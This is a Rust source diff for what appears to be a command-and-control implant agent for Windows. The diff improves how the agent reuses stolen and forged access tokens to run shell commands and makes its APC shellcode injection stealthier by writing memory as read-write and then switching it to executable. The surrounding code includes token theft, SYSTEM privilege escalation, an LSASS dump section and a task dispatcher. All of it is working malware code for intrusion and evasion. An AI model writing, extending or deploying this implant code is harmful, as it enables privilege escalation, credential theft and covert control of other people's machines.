@@ -52,7 +52,7 @@ pub(crate) fn pipe_server_active() -> bool {
 mod portfwd;
 
 use crate::config;
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicIsize, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex, OnceLock};
 use std::collections::HashMap;
 #[cfg(target_os = "windows")]
@@ -293,9 +293,13 @@ pub(crate) fn shell(cmd: &str) -> String {
 
     #[cfg(target_os = "windows")]
     {
-        let sys_tok = unsafe { G_SYSTEM_TOKEN };
+        let sys_tok = G_SYSTEM_TOKEN.load(Ordering::Acquire);
         if sys_tok != 0 {
             return unsafe { shell_as_system(cmd, sys_tok) };
+        }
+        let stolen_tok = G_STOLEN_TOKEN.load(Ordering::Acquire);
+        if stolen_tok != 0 {
+            return unsafe { shell_as_system(cmd, stolen_tok) };
         }
     }
 
@@ -490,11 +494,15 @@ extern "system" {
 // Primary SYSTEM token stored by get_system(); shell() uses it via
 // direct token launch so commands run as SYSTEM on any dispatch thread.
 #[cfg(target_os = "windows")]
-static mut G_SYSTEM_TOKEN: isize = 0;
+static G_SYSTEM_TOKEN: AtomicIsize = AtomicIsize::new(0);
+
+// Primary token from steal-token/make-token; used by shell() when G_SYSTEM_TOKEN is 0.
+#[cfg(target_os = "windows")]
+static G_STOLEN_TOKEN: AtomicIsize = AtomicIsize::new(0);
 
 #[cfg(target_os = "windows")]
 pub(crate) fn system_token_handle() -> isize {
-    unsafe { G_SYSTEM_TOKEN }
+    G_SYSTEM_TOKEN.load(Ordering::Acquire)
 }
 
 // ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
@@ -974,10 +982,12 @@ unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
 unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
-    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
     let mut written = 0usize;
     WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
+    let mut old_prot = 0u32;
+    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old_prot);
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if snap == INVALID_HANDLE_VALUE { CloseHandle(hproc); return "snapshot failed".into(); }
     let mut te: THREADENTRY32 = std::mem::zeroed();
@@ -1018,16 +1028,22 @@ unsafe fn token_steal(pid: u32) -> String {
         return format!("OpenProcessToken failed (err {})", GetLastError());
     }
     CloseHandle(hproc);
+    // Impersonation token for ImpersonateLoggedOnUser
     let mut hdup = 0isize;
     DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
         SecurityImpersonation, TokenImpersonation, &mut hdup);
+    // Primary token for CreateProcessWithTokenW in shell() — try Delegation first
+    let hprim = duplicate_primary_shell_token(htok);
     CloseHandle(htok);
-    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
+    if hdup == 0 { if hprim != 0 { CloseHandle(hprim); } return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
+    if hprim == 0 { CloseHandle(hdup); return format!("DuplicateTokenEx (primary) failed (err {})", GetLastError()); }
     if ImpersonateLoggedOnUser(hdup) == 0 {
-        CloseHandle(hdup);
+        CloseHandle(hdup); CloseHandle(hprim);
         return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
     }
     CloseHandle(hdup);
+    let old = G_STOLEN_TOKEN.swap(hprim, Ordering::AcqRel);
+    if old != 0 { CloseHandle(old); }
     format!("[+] impersonating token from PID {}", pid)
 }
 
@@ -1043,7 +1059,12 @@ unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
         CloseHandle(htok);
         return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
     }
+    // Primary token for shell() via CreateProcessWithTokenW — try Delegation first
+    let hprim = duplicate_primary_shell_token(htok);
     CloseHandle(htok);
+    if hprim == 0 { return format!("DuplicateTokenEx (primary) failed (err {})", GetLastError()); }
+    let old = G_STOLEN_TOKEN.swap(hprim, Ordering::AcqRel);
+    if old != 0 { CloseHandle(old); }
     format!("[+] impersonating {}\\{}", domain, user)
 }
 
@@ -1100,8 +1121,7 @@ unsafe fn get_system() -> String {
         }
         CloseHandle(hdup);
         normalize_token_session(hprim);
-        let old = G_SYSTEM_TOKEN;
-        G_SYSTEM_TOKEN = hprim;
+        let old = G_SYSTEM_TOKEN.swap(hprim, Ordering::AcqRel);
         if old != 0 { CloseHandle(old); }
         return format!("[+] T1 SYSTEM ({} PID={})", match_name, sys_pid);
     }
@@ -1190,8 +1210,7 @@ unsafe fn get_system() -> String {
         CloseHandle(h_thr_tok);
         if hprim != 0 {
             normalize_token_session(hprim);
-            let old = G_SYSTEM_TOKEN;
-            G_SYSTEM_TOKEN = hprim;
+            let old = G_SYSTEM_TOKEN.swap(hprim, Ordering::AcqRel);
             if old != 0 { CloseHandle(old); }
             stored_t2 = true;
         }
@@ -1746,7 +1765,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         #[cfg(target_os = "windows")]
         "TOKEN_DROP" | "REV2SELF" => {
-            unsafe { RevertToSelf(); }
+            unsafe {
+                RevertToSelf();
+                let old = G_STOLEN_TOKEN.swap(0, Ordering::AcqRel);
+                if old != 0 { CloseHandle(old); }
+            }
             t.send_result(task.id, "[+] reverted to original token", "");
         }
         #[cfg(target_os = "windows")]
